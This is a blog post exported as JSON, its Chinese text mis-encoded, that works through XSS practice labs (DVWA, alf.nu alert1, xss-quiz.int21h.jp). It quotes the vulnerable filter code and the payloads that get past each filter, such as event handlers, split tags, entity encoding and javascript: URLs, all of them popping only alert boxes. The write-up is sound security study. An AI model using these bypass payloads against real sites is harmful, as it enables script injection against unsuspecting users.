{"title":"XSS å­¦ä¹ ","slug":"xsså¤‡å¿˜","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xsså¤‡å¿˜.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"xsså¤‡å¿˜\"><a href=\"#xsså¤‡å¿˜\" class=\"headerlink\" title=\"xsså¤‡å¿˜\"></a>xsså¤‡å¿˜</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œé‡‡ç”¨æ­£åˆ™ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒå†™ã€å¤§å°å†™æ··æ·†ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„äº‹ä»¶æ ‡ç­¾ï¼š</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name å¤„é•¿åº¦é™åˆ¶ï¼Œ Message å¤„å°è¯• <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚  <code>addslashes</code>  è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼› <code>htmlspecialchars</code> å¯¹å‚æ•°è¿›è¡Œå®ä½“ç¼–ç ï¼Œæ— æ³•å†å¯¹ <code>message</code> è¿›è¡Œ XSS ï¼Œä½†æ˜¯ <code>name</code> å¤„å¯ä»¥é€šè¿‡ä¿®æ”¹é•¿åº¦è¿›è¡Œ xssã€‚</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>ä¼¼æ›¾ç›¸è¯†å‘¢ğŸ˜‹</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>è¿‡æ»¤äº† <code>&lt;script</code> ,è§‚å¯Ÿé¡µé¢æºç ï¼Œæ‰‹åŠ¨é—­åˆäº‹ä»¶æ ‡ç­¾ <code>&lt;/option&gt;</code> ã€ <code>&lt;/select&gt;</code>ï¼Œç”±äºä»£ç åªæ£€æµ‹ <code>$default</code> ,äºæ˜¯æˆ‘ä»¬åé¢çš„ä»£ç å¯ä»¥é€ƒé€¸ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL ä¸­æ‰€æœ‰åœ¨ # ä¹‹åçš„éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œå› æ­¤ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ¶æ„ä»£ç ä¼šåœ¨åˆ›å»ºé¡µé¢æ—¶è¢«ç”¨æ¥æ¸²æŸ“<br>è¯»å–é¡µé¢å†…å®¹ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>æµè§ˆå™¨å¦‚ä½•æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å›½å¤–çš„æ–‡ç« ï¼š<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTMLäº‹ä»¶å±æ€§ï¼š<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\"><a href=\"#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\" class=\"headerlink\" title=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº\"></a>ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</h1><p>é¶åœºåœ°å€ï¼š<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„å€¼æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ <code>&quot;</code> åŠ äº†ä¸€ä¸ªè½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæˆ–è€…ç”¨ <code>\\</code> å†æ¬¡è½¬ä¹‰</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>ä¸ç¬¬äºŒé¢˜ä¸€æ ·</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>ç¬¬ä¸€è¡Œè¿‡æ»¤å°†æ‰€æœ‰ <code>&lt; &quot;</code> è¿›è¡Œå®ä½“ç¼–ç </p>\n<p>ç¬¬äºŒè¡Œå°†æ‰€æœ‰ <code>http://S+</code> æ›¿æ¢ä¸º <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,è¿™é‡Œ S+ ä¸ºåŒ¹é…ä¸€ä¸ªéç©ºç™½å­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p>\n<p>ç¬¬ä¸‰è¡Œå°† <code>[[a|b]]</code> æ›¿æ¢ä¸º <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>è¾“å‡ºï¼š</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>é€šè¿‡ <code>http://onerror=alert(1)//</code> å¼•å…¥ <code>alt=&quot;***&quot;</code> ,æ­¤æ—¶å¼•å·å†…çš„å†…å®¹è§¦å‘ç¬¬äºŒè¡Œçš„æ£€æµ‹ æ›¿æ¢ä¸º<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> æ­¤æ—¶ <code>href</code> å¸¦æ¥çš„ <code>&quot;</code> å°† <code>alt</code> çš„å¼•å·é—­åˆï¼ŒåŒæ—¶ <code>//</code> å°†åé¢çš„ä»£ç æ³¨é‡Šæ‰ï¼Œé€ æˆ <code>http://onerror=alert(1)</code> é€ƒé€¸å‡ºæ¥ã€‚</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>é€šè¿‡ <code>split</code> å¯¹ä¼ å…¥çš„ s è¿›è¡Œåˆ†å‰²<br>    var s=â€creat#fooâ€; var m=s.split(/#/); m<br>    Array [ â€œcreatâ€, â€œfooâ€ ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>ç›¸å½“äºè°ƒç”¨äº† document.creatXXX() ,è¿™é‡Œæœ‰å‡ ä¸ªå¸¸ç”¨çš„åˆ›å»º DOM èŠ‚ç‚¹æ–¹æ³•</p>\n<pre><code>createElement() åˆ›å»ºä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹\ncreateTextNode() åˆ›å»ºä¸€ä¸ªæ–‡æœ¬èŠ‚ç‚¹\ncreateAttribute() åˆ›å»ºä¸€ä¸ªå±æ€§èŠ‚ç‚¹\ncreateComment() åˆ›å»ºä¸€ä¸ªæ³¨é‡ŠèŠ‚ç‚¹</code></pre><p>æµ‹è¯•æœ€åä¸€ä¸ªï¼š</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: é—­åˆæ³¨é‡Š</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ s å…¨éƒ¨å˜æˆå¤§å†™ï¼Œç›´æ¥è¾“å…¥ <code>alert</code> å˜æˆ <code>ALERT</code> ä¹‹åæ— æ³•æ‰§è¡Œã€‚</p>\n<p>åˆ©ç”¨ HTML ç¼–ç ç»•è¿‡</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>å…³äºæµè§ˆå™¨å¦‚ä½•å¤„ç†ç¼–ç ï¼Œè´´ä¸€ç¯‡å¤§ä½¬åšå®¢ï¼š<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>å…ˆå°è¯• <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>æŸ¥çœ‹æºç å‘ç°è¢«è½¬ä¹‰æˆ</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>çœ‹èµ·æ¥æ— æ³•æˆåŠŸäº†ï¼Œä½†æ˜¯æ—è¾¹è¿˜æœ‰ä¸ªä¸‹æ‹‰æ ï¼Œæˆ‘ä»¬æŠ“åŒ…è¯•è¯•ä¿®æ”¹ç¬¬äºŒä¸ªå‚æ•°ï¼š</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! è¿™ä¸€å…³åªæ˜¯é˜²å¾¡äº†ç¬¬ä¸€ä¸ªæ ä½ï¼Œä»¥åè¦å¤šç•™å¿ƒç±»ä¼¼çš„ã€‚</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>çœ‹èµ·æ¥å’Œç¬¬ä¸‰å…³ä¸€æ ·ï¼Œä»ç„¶æ˜¯å…ˆæµ‹è¯•ï¼Œå‘ç°è¢«è½¬ä¹‰ï¼ŒæŠ“åŒ…å‘ç°å¤šäº†ä¸€ä¸ªå‚æ•° p3 ï¼Œé¦–å…ˆå¯¹æ–°å‚æ•°è¿›è¡Œæµ‹è¯•ï¼Œä¿®æ”¹æˆ <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> å‘åŒ…å‘ç°è¿˜æ˜¯å¤±è´¥ï¼ŒæŸ¥çœ‹æºç ä¹‹åä¸ç¬¬äºŒå…³ä¸€æ ·é—­åˆ <code>&quot;&gt;</code> å³å¯ã€‚</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>å‘ç°åªæ˜¾ç¤ºäº†ä¸€æ®µï¼Œ<code>F12</code> ï¼Œä¿®æ”¹é•¿åº¦å†æµ‹</p>\n<p>æ²¡æœ‰è¿‡æ»¤ã€‚</p>\n<p>å¥½äº†ï¼Œä¿®æ”¹é•¿åº¦ï¼Œç›´æ¥æ’å…¥å§ï¼ </p>\n<p>è¯•å®Œæ²¡æˆåŠŸï¼Œå†çœ‹çœ‹æºç ï¼ŒåŸæ¥æ˜¯æ²¡é—­åˆ <code>value</code> ï¼Œæ‰‹åŠ¨é—­åˆæäº¤ï¼š</p>\n<p>stage5 çš„ä½œç”¨åªæ˜¯æƒ³å‘Šè¯‰æˆ‘ä»¬ <strong>å®¢æˆ·ç«¯çš„é˜²æŠ¤æ˜¯æ— æ•ˆçš„</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>è¢«è½¬ä¹‰ï¼Œè€Œä¸”æ²¡æœ‰å…¶ä»–çš„æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ ä½ï¼Œè¿™æ€ä¹ˆæï¼Ÿ</p>\n<p>ç­”æ¡ˆæ˜¯ç”¨ html è¯­æ³•ï¼ŒXSSä¸æ˜¯åªèƒ½æ’å…¥ JS ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ HTML è¯­æ³•ï¼Œä¸ç”¨ <code>&lt;&gt;/</code> åˆ©ç”¨äº‹ä»¶è§¦å‘</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,è¿™æ¬¡è¿ <code>&quot;</code> éƒ½è½¬ç§»äº†</p>\n<p>è¿˜æ˜¯ä½¿ç”¨ html è¯­æ³•ï¼Œä½¿ç”¨ç©ºæ ¼åˆ†å‰²å±æ€§ï¼ŒåŠ å…¥ä¸€ä¸ª <code>&quot;</code> æ¥ç»“æŸå‰é¢çš„è¯­å¥</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>è¿˜æ˜¯å…ˆæµ‹è¯•ï¼š <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , è¿™æ¬¡æ˜¯å°†è¾“å…¥æ’å…¥åˆ°è¶…é“¾æ¥é‡Œï¼Œæˆ‘ä»¬ç›´æ¥æ’å…¥</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>è¡Œä¸é€šï¼Œå› ä¸ºæˆ‘ä»¬ç‚¹é“¾æ¥å‘ç°æ˜¯ <code>404</code> ï¼Œæ¢æˆ <code>JavaScript</code> è¯•è¯•</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>æ’å…¥åç‚¹å‡»é“¾æ¥ï¼š</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>ä¸æ”¯æŒ UTF-7 ç¼–ç ï¼Œæ‰€ä»¥è·³è¿‡</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]}